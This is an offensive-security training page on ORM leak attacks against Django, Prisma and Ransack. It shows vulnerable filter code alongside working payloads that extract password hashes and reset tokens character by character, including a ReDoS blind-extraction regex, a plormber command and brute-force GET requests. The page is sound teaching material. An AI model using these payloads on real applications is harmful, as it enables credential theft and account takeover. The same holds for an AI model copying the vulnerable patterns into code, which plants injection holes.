---
layout: training-page
title: "ORM Leak — Red Team Academy"
module: "Web Hacking"
tags:
  - orm-leak
  - django
  - prisma
  - ransack
  - data-exfiltration
  - blind-injection
page_key: "web-orm-leak"
render_with_liquid: false
---

# ORM Leak

ORM (Object-Relational Mapping) Leak occurs when user-controlled input is passed directly to ORM filter, query, or ordering methods without sanitization. Attackers can exploit this to traverse model relationships and exfiltrate data they should not have access to — including password hashes, tokens, and other sensitive fields — by brute-forcing values character by character using filter operators like `startsWith`, `contains`, and `regex`.

## Django (Python)

The following pattern is vulnerable: it unpacks user-controlled request data directly into the ORM filter as keyword arguments.

```
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

Django's ORM uses double-underscore notation to specify field lookups. By controlling which fields and operators are passed, an attacker can filter results using partial matches and infer values.

### Basic Field Filter

An attacker can filter by a field they should not have direct access to, using operators that act like SQL LIKE conditions:

```
{
  "username": "admin",
  "password__startswith": "p"
}
```

Useful operators for data extraction:

- `__startswith` — prefix match (case-sensitive)
- `__istartswith` — prefix match (case-insensitive)
- `__contains` — substring match
- `__regex` — regular expression match
- `__gt`, `__lt` — comparison operators

### Relational Filtering — One-to-One

Django's ORM supports traversing relationships using double-underscore chaining. This allows filtering through related models to reach fields on a different table:

```
{
  "created_by__user__password__contains": "p"
}
```

This filter on an Article endpoint leaks information about the password hash of the user who created each article.

### Relational Filtering — Many-to-Many

Traverse deeper relationships to extract data through junction tables:

```
{
  "created_by__departments__employees__user__username__startswith": "p",
  "created_by__departments__employees__user__id": 1
}
```

Systematic extraction steps:

1. Get user IDs: `created_by__departments__employees__user__id`
2. For each ID, get usernames: `created_by__departments__employees__user__username`
3. Leak password hashes: `created_by__departments__employees__user__password`

### Error-based Extraction — ReDoS

When Django uses MySQL, a specially crafted regex can trigger a ReDoS condition (timeout), allowing blind extraction based on whether the server returns a 500 error or a valid response:

```
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// Returns results if the hash starts with "pbkdf1"

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
// Returns HTTP 500 (timeout exceeded) — hash starts with "pbkdf2"
```

## Prisma (Node.js)

Prisma ORM is vulnerable when filter arguments from HTTP requests are passed directly to `findMany`:

```
const posts = await prisma.article.findMany({
  where: req.query.filter as any  // Vulnerable — unvalidated user input
})
```

### Include Related Data

An attacker can use Prisma's `include` option to return all fields from related models:

```
{
  "filter": {
    "include": {
      "createdBy": true
    }
  }
}
```

### Select Specific Fields

Use `select` to fetch only a specific sensitive field:

```
{
  "filter": {
    "select": {
      "createdBy": {
        "select": {
          "password": true
        }
      }
    }
  }
}
```

### One-to-One Relational Filtering

Brute-force a reset token by testing each prefix:

```
GET /articles?filter[createdBy][resetToken][startsWith]=06
```

### Automated Extraction with plormber

```
plormber prisma-contains \
    --chars '0123456789abcdef' \
    --base-query-json '{"query": {PAYLOAD}}' \
    --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
    --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
    --verbose-stats \
    https://some.vuln.app/articles/time-based
```

## Ransack (Ruby)

Ransack is a Ruby gem for search and sorting in Rails applications. Versions before 4.0.0 allowed arbitrary attribute traversal in search parameters, similar to Django's double-underscore syntax.

Extract a password reset token by brute-forcing one character at a time:

```
GET /posts?q[user_reset_password_token_start]=0  # Empty results
GET /posts?q[user_reset_password_token_start]=1  # Empty results
GET /posts?q[user_reset_password_token_start]=2  # Results found — starts with "2"

GET /posts?q[user_reset_password_token_start]=2c  # Empty — 3rd char not 'c'
GET /posts?q[user_reset_password_token_start]=2f  # Results — continues with "2f"
```

Target a specific user and extract their recovery key:

```
GET /labs?q[creator_roles_name_cont]=superadmin&q[creator_recoveries_key_start]=0
```

## Known CVEs

- **CVE-2023-47117** — Label Studio ORM Leak
- **CVE-2023-31133** — Ghost CMS ORM Leak
- **CVE-2023-30843** — Payload CMS ORM Leak

## Resources

- plormber — time-based ORM leak tool — `github.com/elttam/plormber`
- plORMbing your Django ORM — Alex Brown — elttam.com
- plORMbing your Prisma ORM with Time-based Attacks — Alex Brown — elttam.com
- Ransacking your password reset tokens — Lukas Euler — positive.security
- Django QuerySet API reference — docs.djangoproject.com
